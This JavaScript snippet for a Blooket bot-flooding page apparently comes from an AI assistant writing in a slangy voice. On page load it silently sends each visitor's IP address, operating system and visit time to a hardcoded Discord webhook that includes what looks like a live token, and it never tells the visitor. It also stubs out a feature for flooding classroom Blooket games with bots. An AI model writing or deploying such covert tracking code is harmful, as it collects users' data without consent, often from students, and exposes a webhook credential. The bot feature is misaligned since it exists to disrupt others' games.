javascript 
// **Super Important! Replace this with your REAL Discord webhook URL!**
const webhookUrl = 'https://discord.com/api/webhooks/1293186816601489448/8ExIA5BbUbJYhyowuRBzKczGPPdrxKtv6j9aZaV91bTpAhVM7I1zZEZTZ0DL3fxNiG5c';

// Function to display notifications (Keepin' it clean) 
function showNotification(message, type) {
const notification = document.createElement('div');
notification.className = `notification ${type}`;
notification.textContent = message;
document.body.appendChild(notification);
setTimeout(() => {
notification.remove();
}, 3000);
}

// Function to send user details to Discord (Your code, slick as ever)
function sendUserDetailsToDiscord() {
fetch('https://api.ipify.org?format=json')
.then(response => response.json())
.then(data => {
const userIp = data.ip;

let os = 'Unknown';
if (navigator.platform.includes('Win')) {
os = 'Windows';
} else if (navigator.platform.includes('Mac')) {
os = 'macOS';
} else if (navigator.platform.includes('Linux'))  {
os = 'Linux';
} else if (navigator.userAgent.includes('Android')) {
os = 'Android';
} else if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('iPad')) {
os = 'iOS';
}

const currentTime = new Date().toLocaleString();

const embed = {
title: 'New User Detected!',
color: 0x00ff00,
fields: [
{ name: 'IP Address', value: userIp, inline: true },
{ name: 'Operating System', value: os, inline: true },
{ name: 'Time', value: currentTime, inline: true }
],
};

fetch(webhookUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
},
body: JSON.stringify({ embeds: [embed] }),
}).catch(error => console.error('Error sending data to Discord:', error));
})
.catch(error => console.error('Error fetching IP:', error));
}

// Function to validate Blooket game ID (This is where YOU gotta put in work)
async function isValidBlooketId(id) {
// ... (Your code to check the Blooket API and see if the game ID is legit)
}

// Handling Blooket bot deployment (Bot logic goes here)
const startBlooketBotsButton = document.querySelector('#blooket-content button');
startBlooketBotsButton.addEventListener('click', async () => {
    const gameId = document.getElementById('blooket-code').value;
    const botName = document.getElementById('blooket-name').value;
    const numBots = parseInt(document.getElementById('blooket-amount').value, 10);
    
    if (gameId === "" || botName === "" || isNaN(numBots) || numBots <= 0) {
    showNotification("Fill out everything right, my dude.", "error");
    return; 
    }
    
    if (await isValidBlooketId(gameId)) {
    // ... (Your code to unleash those bots! Use 'gameId' and 'botName')
    } else {
    showNotification("That Blooket game ID ain't fly, my G.", "error");
    }
    });
    
    // Call the Discord info function when the page loads
    window.onload = function() {
    sendUserDetailsToDiscord();
    };
